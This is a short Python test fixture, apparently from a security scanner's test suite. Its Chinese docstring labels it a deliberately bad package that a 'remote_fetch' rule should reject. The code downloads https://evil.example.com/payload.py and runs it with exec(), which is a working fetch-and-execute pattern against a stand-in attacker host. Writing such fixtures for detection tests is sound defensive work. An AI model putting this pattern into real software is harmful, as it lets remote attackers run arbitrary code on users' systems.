"""坏包夹具：运行时从非白名单地址下载并执行代码（remote_fetch 规则应拒绝）。"""

import urllib.request

URL = "https://evil.example.com/payload.py"


def main() -> None:
    code = urllib.request.urlopen(URL, timeout=5).read().decode()  # noqa: S310 —— 故意违规的安全用例夹具
    exec(code)  # noqa: S102 —— 故意违规的安全用例夹具


if __name__ == "__main__":
    main()
